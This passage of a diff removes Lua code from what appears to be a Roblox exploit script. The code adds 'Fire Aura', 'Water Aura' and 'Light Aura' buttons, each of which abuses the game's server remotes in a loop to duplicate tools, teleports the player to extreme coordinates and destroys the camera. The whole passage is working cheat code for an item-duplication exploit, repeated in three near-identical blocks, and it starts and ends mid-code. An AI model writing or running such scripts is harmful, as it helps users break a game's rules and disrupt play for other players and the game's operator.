-                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        repeat                 if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-                end
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                toolgrip = true
-                duping = false
-                wait()
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-wait(1)
-local TablaGripPos = {
-       Vector3.new(0, 0, 0),
-  Vector3.new(10, 0, 0),
-  Vector3.new(20, 0, 0),
-  Vector3.new(30, 0, 0),
-  Vector3.new(40, 0, 0),
-  Vector3.new(50, 0, 0),
-  Vector3.new(60, 0, 0),                      
-  Vector3.new(-0, 0, 0),
-  Vector3.new(-10, 0, 0),
-  Vector3.new(-20, 0, 0),
-  Vector3.new(-30, 0, 0),
-  Vector3.new(-40, 0, 0),
-  Vector3.new(-50, 0, 0),
-  Vector3.new(-60, 0, 0),
-                      Vector3.new(0, 0, 30),
-  Vector3.new(10, 0, 30),
-  Vector3.new(20, 0, 30),
-  Vector3.new(30, 0, 30),
-  Vector3.new(40, 0, 30),
-  Vector3.new(50, 0, 30),
-  Vector3.new(60, 0, 30),
-  Vector3.new(-0, 0, 30),
-  Vector3.new(-10, 0, 30),
-  Vector3.new(-20, 0, 30),
-  Vector3.new(-30, 0, 30),
-  Vector3.new(-40, 0, 30),
-  Vector3.new(-50, 0, 30),
-  Vector3.new(-60, 0, 30),
-                          Vector3.new(0, 0, 45),
-  Vector3.new(10, 0, 45),
-  Vector3.new(20, 0, 45),
-  Vector3.new(30, 0, 45),
-  Vector3.new(40, 0, 45),
-  Vector3.new(50, 0, 45),
-  Vector3.new(60, 0, 45),
-  Vector3.new(-0, 0, 45),
-  Vector3.new(-10, 0, 45),
-  Vector3.new(-20, 0, 45),
-  Vector3.new(-30, 0, 45),
-  Vector3.new(-40, 0, 45),
-  Vector3.new(-50, 0, 45),
-  Vector3.new(-60, 0, 45),
-  Vector3.new(0, 0, 15),
-  Vector3.new(10, 0, 15),
-  Vector3.new(20, 0, 15),
-  Vector3.new(30, 0, 15),
-  Vector3.new(40, 0, 15),
-  Vector3.new(50, 0, 15),
-  Vector3.new(60, 0, 15),                          
-  Vector3.new(-0, 0, 15),
-  Vector3.new(-10, 0, 15),
-  Vector3.new(-20, 0, 15),
-  Vector3.new(-30, 0, 15),
-  Vector3.new(-40, 0, 15),
-  Vector3.new(-50, 0, 15),
-  Vector3.new(-60, 0, 15),
-Vector3.new(0, 0, -15),
-  Vector3.new(10, 0, -15),
-  Vector3.new(20, 0, -15),
-  Vector3.new(30, 0, -15),
-  Vector3.new(40, 0, -15),
-  Vector3.new(50, 0, -15),
-  Vector3.new(60, 0, -15),                      
-  Vector3.new(-0, 0, -15),
-  Vector3.new(-10, 0, -15),
-  Vector3.new(-20, 0, -15),
-  Vector3.new(-30, 0, -15),
-  Vector3.new(-40, 0, -15),
-  Vector3.new(-50, 0, -15),
-  Vector3.new(-60, 0, -15),
-  Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -30),
-  Vector3.new(20, 0, -30),
-  Vector3.new(30, 0, -30),
-  Vector3.new(40, 0, -30),
-  Vector3.new(50, 0, -30),
-  Vector3.new(60, 0, -30),                          
-  Vector3.new(-0, 0, -30),
-  Vector3.new(-10, 0, -30),
-  Vector3.new(-20, 0, -30),
-  Vector3.new(-30, 0, -30),
-  Vector3.new(-40, 0, -30),
-  Vector3.new(-50, 0, -30),
-  Vector3.new(-60, 0, -30),
-    Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -45),
-  Vector3.new(20, 0, -45),
-  Vector3.new(30, 0, -45),
-  Vector3.new(40, 0, -45),
-  Vector3.new(50, 0, -45),
-  Vector3.new(60, 0, -45),                          
-  Vector3.new(-0, 0, -45),
-  Vector3.new(-10, 0, -45),
-  Vector3.new(-20, 0, -45),
-  Vector3.new(-30, 0, -45),
-  Vector3.new(-40, 0, -45),
-  Vector3.new(-50, 0, -45),
-  Vector3.new(-60, 0, -45),
-    Vector3.new(10, 0, -60),
-  Vector3.new(20, 0, -60),
-  Vector3.new(30, 0, -60),
-  Vector3.new(40, 0, -60),
-  Vector3.new(50, 0, -60),
-  Vector3.new(60, 0, -60),                          
-  Vector3.new(-0, 0, -60),
-  Vector3.new(-10, 0, -60),
-  Vector3.new(-20, 0, -60),
-  Vector3.new(-30, 0, -60),
-  Vector3.new(-40, 0, -60),
-  Vector3.new(-50, 0, -60),
-  Vector3.new(-60, 0, -60),
-  Vector3.new(10, 0, -75),
-  Vector3.new(20, 0, -75),
-  Vector3.new(30, 0, -75),
-  Vector3.new(40, 0, -75),
-  Vector3.new(50, 0, -75),
-  Vector3.new(60, 0, -75),                          
-  Vector3.new(-0, 0, -75),
-  Vector3.new(-10, 0, -75),
-  Vector3.new(-20, 0, -75),
-  Vector3.new(-30, 0, -75),
-  Vector3.new(-40, 0, -75),
-  Vector3.new(-50, 0, -75),
-  Vector3.new(-60, 0, -75),
-
-
-     }
-      for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-          if tool:IsA("Tool") then
-              tool.Parent = game.Players.LocalPlayer.Character
-              local gripPosIndex = math.min(i, #TablaGripPos)
-              local gripPos = TablaGripPos[gripPosIndex]
-              
-              if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                  tool.GripPos = gripPos
-              else
-              end
-          end
-      end           
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Fire Aura",
-    Callback = function()
-        nametools = "Fire Spray Lel"
-                oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="Warn!",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
-                toolthatiwanttodupe = "PaperbagFire"
-                tools = "PaperbagFire"
-                if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-                        task.wait()
-                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                end
-                wait(0.1)
-                local args = {
-                        [1] = "ClearAllTools"
-                }
-                
-                cleartoolremote:FireServer(unpack(args))
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                for m=1,2 do task.wait()
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-                        end
-                        task.wait(0.2)
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                wait(0.3)
-                duping = true
-                for m=1, 124 do
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                        local args = {
-                                [1] = "PickingTools",
-                                [2] = toolthatiwanttodupe
-                        }
-                        
-                        picktoolremote:InvokeServer(unpack(args))
-                        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        wait()
-                        game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃ¢ÂÂ¥aÃ¢ÂÂ¥nÃ¢ÂÂ¥dÃ¢ÂÂ¥lÃ¢ÂÂ¥e"
-                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        repeat                 if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-                end
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                toolgrip = true
-                duping = false
-                wait()
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-wait(1)
-local TablaGripPos = {
-       Vector3.new(0, 0, 0),
-  Vector3.new(10, 0, 0),
-  Vector3.new(20, 0, 0),
-  Vector3.new(30, 0, 0),
-  Vector3.new(40, 0, 0),
-  Vector3.new(50, 0, 0),
-  Vector3.new(60, 0, 0),                      
-  Vector3.new(-0, 0, 0),
-  Vector3.new(-10, 0, 0),
-  Vector3.new(-20, 0, 0),
-  Vector3.new(-30, 0, 0),
-  Vector3.new(-40, 0, 0),
-  Vector3.new(-50, 0, 0),
-  Vector3.new(-60, 0, 0),
-                      Vector3.new(0, 0, 30),
-  Vector3.new(10, 0, 30),
-  Vector3.new(20, 0, 30),
-  Vector3.new(30, 0, 30),
-  Vector3.new(40, 0, 30),
-  Vector3.new(50, 0, 30),
-  Vector3.new(60, 0, 30),
-  Vector3.new(-0, 0, 30),
-  Vector3.new(-10, 0, 30),
-  Vector3.new(-20, 0, 30),
-  Vector3.new(-30, 0, 30),
-  Vector3.new(-40, 0, 30),
-  Vector3.new(-50, 0, 30),
-  Vector3.new(-60, 0, 30),
-                          Vector3.new(0, 0, 45),
-  Vector3.new(10, 0, 45),
-  Vector3.new(20, 0, 45),
-  Vector3.new(30, 0, 45),
-  Vector3.new(40, 0, 45),
-  Vector3.new(50, 0, 45),
-  Vector3.new(60, 0, 45),
-  Vector3.new(-0, 0, 45),
-  Vector3.new(-10, 0, 45),
-  Vector3.new(-20, 0, 45),
-  Vector3.new(-30, 0, 45),
-  Vector3.new(-40, 0, 45),
-  Vector3.new(-50, 0, 45),
-  Vector3.new(-60, 0, 45),
-  Vector3.new(0, 0, 15),
-  Vector3.new(10, 0, 15),
-  Vector3.new(20, 0, 15),
-  Vector3.new(30, 0, 15),
-  Vector3.new(40, 0, 15),
-  Vector3.new(50, 0, 15),
-  Vector3.new(60, 0, 15),                          
-  Vector3.new(-0, 0, 15),
-  Vector3.new(-10, 0, 15),
-  Vector3.new(-20, 0, 15),
-  Vector3.new(-30, 0, 15),
-  Vector3.new(-40, 0, 15),
-  Vector3.new(-50, 0, 15),
-  Vector3.new(-60, 0, 15),
-Vector3.new(0, 0, -15),
-  Vector3.new(10, 0, -15),
-  Vector3.new(20, 0, -15),
-  Vector3.new(30, 0, -15),
-  Vector3.new(40, 0, -15),
-  Vector3.new(50, 0, -15),
-  Vector3.new(60, 0, -15),                      
-  Vector3.new(-0, 0, -15),
-  Vector3.new(-10, 0, -15),
-  Vector3.new(-20, 0, -15),
-  Vector3.new(-30, 0, -15),
-  Vector3.new(-40, 0, -15),
-  Vector3.new(-50, 0, -15),
-  Vector3.new(-60, 0, -15),
-  Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -30),
-  Vector3.new(20, 0, -30),
-  Vector3.new(30, 0, -30),
-  Vector3.new(40, 0, -30),
-  Vector3.new(50, 0, -30),
-  Vector3.new(60, 0, -30),                          
-  Vector3.new(-0, 0, -30),
-  Vector3.new(-10, 0, -30),
-  Vector3.new(-20, 0, -30),
-  Vector3.new(-30, 0, -30),
-  Vector3.new(-40, 0, -30),
-  Vector3.new(-50, 0, -30),
-  Vector3.new(-60, 0, -30),
-    Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -45),
-  Vector3.new(20, 0, -45),
-  Vector3.new(30, 0, -45),
-  Vector3.new(40, 0, -45),
-  Vector3.new(50, 0, -45),
-  Vector3.new(60, 0, -45),                          
-  Vector3.new(-0, 0, -45),
-  Vector3.new(-10, 0, -45),
-  Vector3.new(-20, 0, -45),
-  Vector3.new(-30, 0, -45),
-  Vector3.new(-40, 0, -45),
-  Vector3.new(-50, 0, -45),
-  Vector3.new(-60, 0, -45),
-    Vector3.new(10, 0, -60),
-  Vector3.new(20, 0, -60),
-  Vector3.new(30, 0, -60),
-  Vector3.new(40, 0, -60),
-  Vector3.new(50, 0, -60),
-  Vector3.new(60, 0, -60),                          
-  Vector3.new(-0, 0, -60),
-  Vector3.new(-10, 0, -60),
-  Vector3.new(-20, 0, -60),
-  Vector3.new(-30, 0, -60),
-  Vector3.new(-40, 0, -60),
-  Vector3.new(-50, 0, -60),
-  Vector3.new(-60, 0, -60),
-  Vector3.new(10, 0, -75),
-  Vector3.new(20, 0, -75),
-  Vector3.new(30, 0, -75),
-  Vector3.new(40, 0, -75),
-  Vector3.new(50, 0, -75),
-  Vector3.new(60, 0, -75),                          
-  Vector3.new(-0, 0, -75),
-  Vector3.new(-10, 0, -75),
-  Vector3.new(-20, 0, -75),
-  Vector3.new(-30, 0, -75),
-  Vector3.new(-40, 0, -75),
-  Vector3.new(-50, 0, -75),
-  Vector3.new(-60, 0, -75),
-
-
-     }
-      for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-          if tool:IsA("Tool") then
-              tool.Parent = game.Players.LocalPlayer.Character
-              local gripPosIndex = math.min(i, #TablaGripPos)
-              local gripPos = TablaGripPos[gripPosIndex]
-              
-              if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                  tool.GripPos = gripPos
-              else
-              end
-          end
-      end           
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Water Aura",
-    Callback = function()
-        nametools = "Water Spray Lel"
-                oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="Warn!",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
-                toolthatiwanttodupe = "WateringCan"
-                tools = "WateringCan"
-                if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-                        task.wait()
-                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                end
-                wait(0.1)
-                local args = {
-                        [1] = "ClearAllTools"
-                }
-                
-                cleartoolremote:FireServer(unpack(args))
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                for m=1,2 do task.wait()
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-                        end
-                        task.wait(0.2)
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                wait(0.3)
-                duping = true
-                for m=1, 124 do
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                        local args = {
-                                [1] = "PickingTools",
-                                [2] = toolthatiwanttodupe
-                        }
-                        
-                        picktoolremote:InvokeServer(unpack(args))
-                        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        wait()
-                        game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃ¢ÂÂ¥aÃ¢ÂÂ¥nÃ¢ÂÂ¥dÃ¢ÂÂ¥lÃ¢ÂÂ¥e"
-                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        repeat                 if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-                end
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                toolgrip = true
-                duping = false
-                wait()
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-wait(1)
-local TablaGripPos = {
-       Vector3.new(0, 0, 0),
-  Vector3.new(10, 0, 0),
-  Vector3.new(20, 0, 0),
-  Vector3.new(30, 0, 0),
-  Vector3.new(40, 0, 0),
-  Vector3.new(50, 0, 0),
-  Vector3.new(60, 0, 0),                      
-  Vector3.new(-0, 0, 0),
-  Vector3.new(-10, 0, 0),
-  Vector3.new(-20, 0, 0),
-  Vector3.new(-30, 0, 0),
-  Vector3.new(-40, 0, 0),
-  Vector3.new(-50, 0, 0),
-  Vector3.new(-60, 0, 0),
-                      Vector3.new(0, 0, 30),
-  Vector3.new(10, 0, 30),
-  Vector3.new(20, 0, 30),
-  Vector3.new(30, 0, 30),
-  Vector3.new(40, 0, 30),
-  Vector3.new(50, 0, 30),
-  Vector3.new(60, 0, 30),
-  Vector3.new(-0, 0, 30),
-  Vector3.new(-10, 0, 30),
-  Vector3.new(-20, 0, 30),
-  Vector3.new(-30, 0, 30),
-  Vector3.new(-40, 0, 30),
-  Vector3.new(-50, 0, 30),
-  Vector3.new(-60, 0, 30),
-                          Vector3.new(0, 0, 45),
-  Vector3.new(10, 0, 45),
-  Vector3.new(20, 0, 45),
-  Vector3.new(30, 0, 45),
-  Vector3.new(40, 0, 45),
-  Vector3.new(50, 0, 45),
-  Vector3.new(60, 0, 45),
-  Vector3.new(-0, 0, 45),
-  Vector3.new(-10, 0, 45),
-  Vector3.new(-20, 0, 45),
-  Vector3.new(-30, 0, 45),
-  Vector3.new(-40, 0, 45),
-  Vector3.new(-50, 0, 45),
-  Vector3.new(-60, 0, 45),
-  Vector3.new(0, 0, 15),
-  Vector3.new(10, 0, 15),
-  Vector3.new(20, 0, 15),
-  Vector3.new(30, 0, 15),
-  Vector3.new(40, 0, 15),
-  Vector3.new(50, 0, 15),
-  Vector3.new(60, 0, 15),                          
-  Vector3.new(-0, 0, 15),
-  Vector3.new(-10, 0, 15),
-  Vector3.new(-20, 0, 15),
-  Vector3.new(-30, 0, 15),
-  Vector3.new(-40, 0, 15),
-  Vector3.new(-50, 0, 15),
-  Vector3.new(-60, 0, 15),
-Vector3.new(0, 0, -15),
-  Vector3.new(10, 0, -15),
-  Vector3.new(20, 0, -15),
-  Vector3.new(30, 0, -15),
-  Vector3.new(40, 0, -15),
-  Vector3.new(50, 0, -15),
-  Vector3.new(60, 0, -15),                      
-  Vector3.new(-0, 0, -15),
-  Vector3.new(-10, 0, -15),
-  Vector3.new(-20, 0, -15),
-  Vector3.new(-30, 0, -15),
-  Vector3.new(-40, 0, -15),
-  Vector3.new(-50, 0, -15),
-  Vector3.new(-60, 0, -15),
-  Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -30),
-  Vector3.new(20, 0, -30),
-  Vector3.new(30, 0, -30),
-  Vector3.new(40, 0, -30),
-  Vector3.new(50, 0, -30),
-  Vector3.new(60, 0, -30),                          
-  Vector3.new(-0, 0, -30),
-  Vector3.new(-10, 0, -30),
-  Vector3.new(-20, 0, -30),
-  Vector3.new(-30, 0, -30),
-  Vector3.new(-40, 0, -30),
-  Vector3.new(-50, 0, -30),
-  Vector3.new(-60, 0, -30),
-    Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -45),
-  Vector3.new(20, 0, -45),
-  Vector3.new(30, 0, -45),
-  Vector3.new(40, 0, -45),
-  Vector3.new(50, 0, -45),
-  Vector3.new(60, 0, -45),                          
-  Vector3.new(-0, 0, -45),
-  Vector3.new(-10, 0, -45),
-  Vector3.new(-20, 0, -45),
-  Vector3.new(-30, 0, -45),
-  Vector3.new(-40, 0, -45),
-  Vector3.new(-50, 0, -45),
-  Vector3.new(-60, 0, -45),
-    Vector3.new(10, 0, -60),
-  Vector3.new(20, 0, -60),
-  Vector3.new(30, 0, -60),
-  Vector3.new(40, 0, -60),
-  Vector3.new(50, 0, -60),
-  Vector3.new(60, 0, -60),                          
-  Vector3.new(-0, 0, -60),
-  Vector3.new(-10, 0, -60),
-  Vector3.new(-20, 0, -60),
-  Vector3.new(-30, 0, -60),
-  Vector3.new(-40, 0, -60),
-  Vector3.new(-50, 0, -60),
-  Vector3.new(-60, 0, -60),
-  Vector3.new(10, 0, -75),
-  Vector3.new(20, 0, -75),
-  Vector3.new(30, 0, -75),
-  Vector3.new(40, 0, -75),
-  Vector3.new(50, 0, -75),
-  Vector3.new(60, 0, -75),                          
-  Vector3.new(-0, 0, -75),
-  Vector3.new(-10, 0, -75),
-  Vector3.new(-20, 0, -75),
-  Vector3.new(-30, 0, -75),
-  Vector3.new(-40, 0, -75),
-  Vector3.new(-50, 0, -75),
-  Vector3.new(-60, 0, -75),
-
-
-     }
-      for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-          if tool:IsA("Tool") then
-              tool.Parent = game.Players.LocalPlayer.Character
-              local gripPosIndex = math.min(i, #TablaGripPos)
-              local gripPos = TablaGripPos[gripPosIndex]
-              
-              if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                  tool.GripPos = gripPos
-              else
-              end
-          end
-      end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Light Aura",
-    Callback = function()
-        nametools = "Light Spray Lel"
-                oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="Warn!",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
-                toolthatiwanttodupe = "FlashLight"
-                tools = "FlashLight"
-                if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-                        task.wait()
-                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                end
-                wait(0.1)
-                local args = {
-                        [1] = "ClearAllTools"
-                }
-                
-                cleartoolremote:FireServer(unpack(args))
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                for m=1,2 do task.wait()
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-                        end
-                        task.wait(0.2)
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                wait(0.3)
-                duping = true
-                for m=1, 124 do
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                        local args = {
-                                [1] = "PickingTools",
-                                [2] = toolthatiwanttodupe
-                        }
-                        
-                        picktoolremote:InvokeServer(unpack(args))
-                        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        wait()
-                        game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃ¢ÂÂ¥aÃ¢ÂÂ¥nÃ¢ÂÂ¥dÃ¢ÂÂ¥lÃ¢ÂÂ¥e"
-                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        repeat                 if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-                end
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                toolgrip = true
-                duping = false
-                wait()
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-wait(1)
-local TablaGripPos = {
-       Vector3.new(0, 0, 0),
-  Vector3.new(10, 0, 0),
-  Vector3.new(20, 0, 0),
-  Vector3.new(30, 0, 0),
-  Vector3.new(40, 0, 0),
-  Vector3.new(50, 0, 0),
-  Vector3.new(60, 0, 0),                      
-  Vector3.new(-0, 0, 0),
-  Vector3.new(-10, 0, 0),
-  Vector3.new(-20, 0, 0),
-  Vector3.new(-30, 0, 0),
-  Vector3.new(-40, 0, 0),
-  Vector3.new(-50, 0, 0),
-  Vector3.new(-60, 0, 0),
-                      Vector3.new(0, 0, 30),
-  Vector3.new(10, 0, 30),
-  Vector3.new(20, 0, 30),
-  Vector3.new(30, 0, 30),
-  Vector3.new(40, 0, 30),
-  Vector3.new(50, 0, 30),
-  Vector3.new(60, 0, 30),
-  Vector3.new(-0, 0, 30),
-  Vector3.new(-10, 0, 30),
-  Vector3.new(-20, 0, 30),
-  Vector3.new(-30, 0, 30),
-  Vector3.new(-40, 0, 30),
-  Vector3.new(-50, 0, 30),
-  Vector3.new(-60, 0, 30),
-                          Vector3.new(0, 0, 45),
-  Vector3.new(10, 0, 45),
-  Vector3.new(20, 0, 45),
-  Vector3.new(30, 0, 45),
-  Vector3.new(40, 0, 45),
-  Vector3.new(50, 0, 45),
-  Vector3.new(60, 0, 45),
-  Vector3.new(-0, 0, 45),
-  Vector3.new(-10, 0, 45),
-  Vector3.new(-20, 0, 45),
-  Vector3.new(-30, 0, 45),
-  Vector3.new(-40, 0, 45),
-  Vector3.new(-50, 0, 45),
-  Vector3.new(-60, 0, 45),
-  Vector3.new(0, 0, 15),
-  Vector3.new(10, 0, 15),
-  Vector3.new(20, 0, 15),
-  Vector3.new(30, 0, 15),
-  Vector3.new(40, 0, 15),
-  Vector3.new(50, 0, 15),
-  Vector3.new(60, 0, 15),                          
-  Vector3.new(-0, 0, 15),
-  Vector3.new(-10, 0, 15),
-  Vector3.new(-20, 0, 15),
-  Vector3.new(-30, 0, 15),
-  Vector3.new(-40, 0, 15),
-  Vector3.new(-50, 0, 15),
-  Vector3.new(-60, 0, 15),
-Vector3.new(0, 0, -15),
-  Vector3.new(10, 0, -15),
-  Vector3.new(20, 0, -15),
-  Vector3.new(30, 0, -15),
-  Vector3.new(40, 0, -15),
-  Vector3.new(50, 0, -15),
-  Vector3.new(60, 0, -15),                      
-  Vector3.new(-0, 0, -15),
-  Vector3.new(-10, 0, -15),
-  Vector3.new(-20, 0, -15),
-  Vector3.new(-30, 0, -15),
-  Vector3.new(-40, 0, -15),
-  Vector3.new(-50, 0, -15),
-  Vector3.new(-60, 0, -15),
-  Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -30),
-  Vector3.new(20, 0, -30),
-  Vector3.new(30, 0, -30),
-  Vector3.new(40, 0, -30),
-  Vector3.new(50, 0, -30),
-  Vector3.new(60, 0, -30),                          
-  Vector3.new(-0, 0, -30),
-  Vector3.new(-10, 0, -30),
-  Vector3.new(-20, 0, -30),
-  Vector3.new(-30, 0, -30),
-  Vector3.new(-40, 0, -30),
-  Vector3.new(-50, 0, -30),
-  Vector3.new(-60, 0, -30),
-    Vector3.new(0, 0, -30),
-  Vector3.new(10, 0, -45),
-  Vector3.new(20, 0, -45),
-  Vector3.new(30, 0, -45),
-  Vector3.new(40, 0, -45),
-  Vector3.new(50, 0, -45),
-  Vector3.new(60, 0, -45),                          
-  Vector3.new(-0, 0, -45),
-  Vector3.new(-10, 0, -45),
-  Vector3.new(-20, 0, -45),
-  Vector3.new(-30, 0, -45),
-  Vector3.new(-40, 0, -45),
-  Vector3.new(-50, 0, -45),
-  Vector3.new(-60, 0, -45),
-    Vector3.new(10, 0, -60),
-  Vector3.new(20, 0, -60),
-  Vector3.new(30, 0, -60),
-  Vector3.new(40, 0, -60),
-  Vector3.new(50, 0, -60),
-  Vector3.new(60, 0, -60),                          
-  Vector3.new(-0, 0, -60),
-  Vector3.new(-10, 0, -60),
-  Vector3.new(-20, 0, -60),
-  Vector3.new(-30, 0, -60),
-  Vector3.new(-40, 0, -60),
-  Vector3.new(-50, 0, -60),
-  Vector3.new(-60, 0, -60),
-  Vector3.new(10, 0, -75),
-  Vector3.new(20, 0, -75),
-  Vector3.new(30, 0, -75),
-  Vector3.new(40, 0, -75),
-  Vector3.new(50, 0, -75),
-  Vector3.new(60, 0, -75),                          
-  Vector3.new(-0, 0, -75),
-  Vector3.new(-10, 0, -75),
-  Vector3.new(-20, 0, -75),
-  Vector3.new(-30, 0, -75),
